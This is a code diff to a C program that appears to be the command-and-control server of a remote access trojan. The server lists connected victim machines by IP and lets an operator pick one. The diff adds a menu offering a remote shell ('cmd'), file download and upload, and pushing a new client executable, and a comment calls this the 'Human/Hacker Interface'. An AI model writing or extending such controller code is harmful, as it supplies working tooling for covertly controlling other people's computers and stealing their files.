@@ -43,19 +43,24 @@ void * threadHI(void * param)
 		Sleep(1000);
 		c = 1;
 		selectedClient = -1;
+
 		for (var = 0; var < sockets.fd_count; ++var)
 		{
 			x = sizeof(struct  sockaddr);
 			memset(&clientInfos, 0, sizeof(struct sockaddr_in));
 			getpeername(sockets.fd_array[var], (struct  sockaddr *)&clientInfos, &x);
-			printf("Client Socket : %u, Client IP %s\n", (unsigned int) sockets.fd_array[var], inet_ntoa(clientInfos.sin_addr));
+
+			if (inet_ntoa(clientInfos.sin_addr)[0] != '0')
+				printf("Client Socket : %u, Client IP %s\n", (unsigned int) sockets.fd_array[var], inet_ntoa(clientInfos.sin_addr));
 		}
 
-		puts("Enter Socket\tConnect client");
+		puts("\n\nEnter Socket\tConnect client\tEnter 0 for Refresh");
 		scanf("%u", &i);
 		fflush(stdin);
+
 		c = 0;
 		system("cls");
+		if (!i) continue;
 
 		for (var = 0; var < sockets.fd_count; ++var)
 		{
@@ -68,6 +73,7 @@ void * threadHI(void * param)
 
 		if (selectedClient != -1)
 		{
+			puts("Command List\n1- cmd\n2- getFile <Path>\n3- sendFile <Path>\n4- update <NewClientExe>\n\n");
 			fgets(al, 300, stdin);
 			al[strlen(al) - 1] = 0;
 			senderText(selectedClient, al);
@@ -87,17 +93,26 @@ static void commWithSystems(void)
 	int i, newClient, server;
 	struct sockaddr_in myInfos, clientInfos;
 
+	/*
+	 * Create TCP Socket
+	 */
 	if (SOCKET_ERROR == (server = socket(AF_INET, SOCK_STREAM, 0)))
 	{
 		CNF_ERROR("socket");
 		return;
 	}
 
+	/*
+	 * Fill "sockaddr_in" struct
+	 */
 	myInfos.sin_family = AF_INET;
 	myInfos.sin_port = htons(PORT);
 	myInfos.sin_addr.s_addr = INADDR_ANY;
 	memset(myInfos.sin_zero, 0, 8);
 
+	/*
+	 * Bind socket
+	 */
 	if (SOCKET_ERROR == bind(server, (struct  sockaddr *)&myInfos, sizeof(struct  sockaddr)))
 	{
 		CNF_ERROR("bind");
@@ -105,6 +120,9 @@ static void commWithSystems(void)
 		return;
 	}
 
+	/*
+	 * Listen config
+	 */
 	if (SOCKET_ERROR == listen(server, 10))
 	{
 		CNF_ERROR("listen");
@@ -112,13 +130,23 @@ static void commWithSystems(void)
 		return;
 	}
 
+	/*
+	 * FD_SET config
+	 */
 	FD_ZERO(&temp);
 	FD_ZERO(&sockets);
 	FD_SET(server, &temp);
 
+	/*
+	 * Create Thread Clients For Human/Hacker Interface :D
+	 */
 	pthread_create(&th, NULL, threadHI, al);
 	pthread_detach(th);
 
+
+	/*
+	 * For Clients
+	 */
 	for(;;)
 	{
 		sockets.fd_count = temp.fd_count;
